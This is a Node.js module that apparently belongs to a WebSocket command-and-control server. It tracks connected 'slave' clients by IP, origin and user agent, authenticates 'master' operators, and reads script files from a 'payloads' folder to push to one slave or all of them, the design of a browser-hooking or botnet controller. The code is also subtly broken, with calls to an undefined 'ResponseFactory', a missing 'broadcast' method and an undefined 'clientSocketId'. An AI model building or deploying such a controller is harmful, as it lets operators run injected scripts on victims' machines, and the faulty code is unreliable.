var fs = require('fs');
var config = require('../../config.js');
var clientAuthService = require('./ClientAuthService.js');
var clientType = require('./ClientType.js');
var clientFactory = require('./ClientFactory');
var clientPool = require('./ClientPool.js');
var commands = require('./../Commands.js');
var response = require('./ResponseFactory.js');
var utils = require('./../Utils.js');
var wss = require('./../WebSocketServerFactory.js');


module.exports = {
  currentSocketId: -1, // @replace with a unique hash
  getAll() {
    return clientPool.getAll();
  },
  addSlave(ip, origin, agent, wsSender) {
    var socketId = ++this.currentSocketId;
    var client = clientFactory(
      this.currentSocketId,
      clientType.slave,
      ip,
      origin,
      agent,
      wsSender
    );
    clientPool.add(client);
    utils.output('Slave socketId #'+socketId+' connected.');
    return socketId;
  },
  auth(socketId, user, pass) {
    var responseJson;
    if(clientAuthService.authenticate(user,pass) === false) {
      responseJson = ResponseFactory('failure', {
          message: 'Wrong username or password'
      });
    } else {
      responseJson = ResponseFactory('success', {
          message: 'Rejuice!'
      });
      var client = clientPool.get(socketId);
      client.setNick(user);
      client.setType(clientType.master);
    }
    this.sendJson(
      client ? client : clientPool.get(socketId),
      responseJson
    );
  },
  broadcastToSlaves(message) {
    clientPool.getAll().forEach( (client) => {
      this.sendToType(message, client, clientType.slave);
    });
  },
  broadcastToMasters(message) {
    clientPool.getAll().forEach( (client) => {
      this.sendToType(message, client, clientType.master);
    });
  },
  send(client, message) {
    client.getSender().send(message);
  },
  sendToType(message, client, type) {
    if(client.getType() === type) {
      this.send(client, message);
    }
  },
  sendJson(client, data) {
    this.send(client, JSON.stringify(data));
  },
  sendAllJson(data) {
    clientPool.getAll().forEach( (client) => {
      this.send(
        client,
        JSON.stringify(data)
      );
    });
  },
  sendCommand(client, command) {
    this.send(client, command());
  },
  sendAllCommand(command) {
    this.broadcast(command());
  },
  sendScript(client, file) {
    var that = this;
    fs.readFile('./payloads/'+file, 'utf8', function (err,data) {
      if (err) {
        return console.log(err);
      }
      that.send(client, data);
    });
  },
  sendAllScript(file) {
    var that = this;
    fs.readFile('./payloads/'+file, 'utf8', function (err,data) {
      if (err) {
        return console.log(err);
      }
      that.broadcast(data);
    });
  },
  remove(socketId) {
    clientPool.remove(socketId);
    utils.output('Slave socketId #'+clientSocketId+' Disconnected.');
  }
};
